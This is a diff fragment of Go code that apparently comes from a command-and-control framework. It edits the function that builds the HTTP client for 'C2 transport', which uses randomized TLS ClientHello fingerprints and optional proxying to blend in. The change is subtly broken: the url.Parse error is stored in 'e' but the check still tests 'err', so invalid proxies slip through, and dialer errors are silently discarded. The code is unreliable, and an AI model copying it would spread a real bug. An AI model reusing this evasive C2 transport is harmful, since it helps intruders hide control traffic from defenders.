@@ -44,15 +44,15 @@ func EmpHTTPClient(c2_addr, proxyServer string) *http.Client {
 	log.Printf("CA cert fingerprint: %s", SHA256SumRaw(ca_crt.Raw))
 
 	// set proxyURL to nil to use direct connection for C2 transport
-	proxyDialer, err := makeProxyDialer(nil, config, clientHelloIDMap["hellorandomizedalpn"])
+	proxyDialer, _ := makeProxyDialer(nil, config, clientHelloIDMap["hellorandomizedalpn"])
 	if proxyServer != "" {
 		// use a proxy for our HTTP client
-		proxyUrl, err := url.Parse(proxyServer)
+		proxyUrl, e := url.Parse(proxyServer)
 		if err != nil {
-			LogFatalError("Invalid proxy: %v", err)
+			LogFatalError("Invalid proxy: %v", e)
 		}
 
-		proxyDialer, err = makeProxyDialer(proxyUrl, config, clientHelloIDMap["hellorandomizedalpn"])
+		proxyDialer, _ = makeProxyDialer(proxyUrl, config, clientHelloIDMap["hellorandomizedalpn"])
 	}
 
 	// transport of our http client, with configured TLS client
